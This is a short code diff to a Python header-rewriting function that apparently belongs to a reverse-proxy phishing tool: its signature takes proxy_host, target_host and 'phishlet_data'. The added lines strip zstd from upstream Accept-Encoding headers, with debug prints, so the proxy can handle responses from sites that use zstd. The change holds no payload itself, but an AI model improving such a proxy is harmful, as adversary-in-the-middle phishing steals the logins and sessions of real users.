@@ -12,6 +12,28 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
         # It's already a regular dict
         headers_dict = headers.copy()
     
+    # Check and modify Accept-Encoding header to remove zstd if present
+    if 'Accept-Encoding' in headers_dict:
+        accept_encoding = headers_dict['Accept-Encoding']
+        print(f"\n  🟢 🟢---- Original Accept-Encoding: {accept_encoding}")
+        
+        # Check if zstd is present in the Accept-Encoding header
+        if 'zstd' in accept_encoding.lower():
+            # Remove zstd from the Accept-Encoding header
+            # Split by comma, filter out zstd, and rejoin
+            encodings = [enc.strip() for enc in accept_encoding.split(',')]
+            filtered_encodings = [enc for enc in encodings if 'zstd' not in enc.lower()]
+            
+            if filtered_encodings:
+                headers_dict['Accept-Encoding'] = ', '.join(filtered_encodings)
+                print(f"  🔧 Removed zstd from Accept-Encoding: {headers_dict['Accept-Encoding']}")
+            else:
+                # If no encodings left after removing zstd, set to identity
+                headers_dict['Accept-Encoding'] = 'identity'
+                print(f"  🔧 No encodings left after removing zstd, set to identity")
+        else:
+            print(f"  ✅ zstd not found in Accept-Encoding, keeping as is")
+    
     # Remove any Accept-Encoding to force identity (no compression) from upstream
     # This avoids sending compressed payloads (e.g., br) that we might not decompress.
     # keys_to_delete = [k for k in list(headers_dict.keys()) if k.lower() == 'accept-encoding']
